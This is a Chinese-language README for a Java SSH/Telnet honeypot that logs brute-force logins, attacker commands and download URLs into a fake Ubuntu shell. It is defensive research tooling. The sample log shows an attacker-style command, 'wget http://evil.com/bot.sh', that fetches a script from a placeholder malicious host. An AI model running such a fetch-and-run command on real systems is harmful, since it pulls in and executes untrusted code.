# SSH/Telnet 蜜罐 (Java 25)

一款中交互蜜罐，用于捕获针对服务器的 SSH/Telnet 暴力破解与入侵行为。
基于 **Apache MINA SSHD** 实现 SSH 协议，原生 Socket 实现 Telnet 协议，
内置伪装的 Ubuntu 22.04 虚拟文件系统与伪 Shell。

> ⚠️ 仅用于安全研究与授权环境。蜜罐会吸引真实攻击者，请务必在隔离的
> 测试/专用机器上运行，不要部署在存有敏感数据的生产服务器上。

## 功能特性

- **SSH 服务**：伪装 `OpenSSH_8.9p1 Ubuntu`，任意账号密码均可"登录成功"，凭证全部记录
- **Telnet 服务**：模拟经典 `login:` 流程，含 IAC 终端协商
- **伪 Shell**：
  - 行编辑（回显、退格、上下箭头翻历史、Ctrl+C / Ctrl+D）
  - 40+ 命令：`ls` `cd` `cat` `pwd` `echo` `whoami` `id` `uname` `ps` `w` `df` `free`
    `ifconfig` `netstat` `wget` `curl` `touch` `mkdir` `rm` `history` `su` `sudo` `apt` 等
  - 支持 `;`、`&&`、管道（取首命令）、`>` / `>>` 重定向（写入虚拟文件系统）
- **虚拟文件系统**：含诱饵文件 `/etc/passwd`、`/etc/shadow`、`/root/.my.cnf`、
  `/root/.bash_history` 等，攻击者的增删改只发生在内存中
- **攻击日志**：JSONL 格式（`logs/honeypot.jsonl`），记录来源 IP、登录凭证、
  每条命令、恶意下载 URL、会话时长，可直接对接 ELK / jq 分析
- **exec 通道支持**：记录 `ssh user@host "cmd"` 形式的非交互攻击

## 构建

```bash
# 需要 JDK 25+
mvn package
# 产物：target/ssh-honeypot-j.jar（含全部依赖的可执行 jar）
```

## 运行

```bash
java -jar target/ssh-honeypot-j.jar                        # 使用默认 config.yaml
java -jar target/ssh-honeypot-j.jar -c /etc/honeypot.yaml  # 指定配置文件
```

生产环境建议叠加 JDK 25 运行时优化参数（紧凑对象头，减少海量会话对象内存占用）：

```bash
java -XX:+UseCompactObjectHeaders -jar target/ssh-honeypot-j.jar
```

### 配置文件（config.yaml）

```yaml
ssh:
  enabled: true      # 是否启用 SSH 服务
  port: 2222         # SSH 监听端口

telnet:
  enabled: true      # 是否启用 Telnet 服务
  port: 2323         # Telnet 监听端口

log:
  file: logs/honeypot.jsonl   # 攻击日志文件路径
```

配置文件不存在时使用内置默认值（SSH:2222、Telnet:2323、日志 logs/honeypot.jsonl）。

### 映射到真实 22/23 端口（Linux）

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2323
```

注意先把真实 sshd 移到别的端口，避免把自己锁在门外。

## 测试

```bash
ssh -p 2222 root@127.0.0.1        # 任意密码可登录
telnet 127.0.0.1 2323             # 任意账号密码可登录
ssh -p 2222 root@127.0.0.1 "uname -a; cat /etc/passwd"
```

## 日志格式

每行一个 JSON 事件：

```json
{"ts":"2026-08-11 15:40:01.123","event":"auth_attempt","session":"s1-...","protocol":"ssh","src_ip":"1.2.3.4","username":"root","password":"123456","success":"true"}
{"ts":"2026-08-11 15:40:05.456","event":"command","session":"s1-...","src_ip":"1.2.3.4","username":"root","command":"wget http://evil.com/bot.sh"}
{"ts":"2026-08-11 15:40:05.789","event":"download","session":"s1-...","src_ip":"1.2.3.4","username":"root","url":"http://evil.com/bot.sh"}
```

事件类型：`session_open` / `auth_attempt` / `command` / `download` / `session_close`

## 项目结构

```
src/main/java/com/honeypot/
├── Main.java                      # 入口：加载配置、启动服务、优雅关闭
├── config/HoneypotConfig.java     # YAML 配置加载（默认 config.yaml）
├── fs/
│   ├── VNode.java                 # 虚拟文件节点
│   └── VirtualFileSystem.java     # 内存文件系统（伪装 Ubuntu）
├── shell/
│   ├── FakeShell.java             # 交互式行编辑 + REPL（SSH/Telnet 共用）
│   ├── CommandProcessor.java      # 命令解释器（40+ 命令）
│   └── SessionState.java          # 会话状态（用户/目录/历史）
├── ssh/SshHoneypotServer.java     # SSH 服务（MINA SSHD）
├── telnet/TelnetHoneypotServer.java # Telnet 服务（原生 Socket）
└── log/AttackLogger.java          # JSONL 攻击日志
```
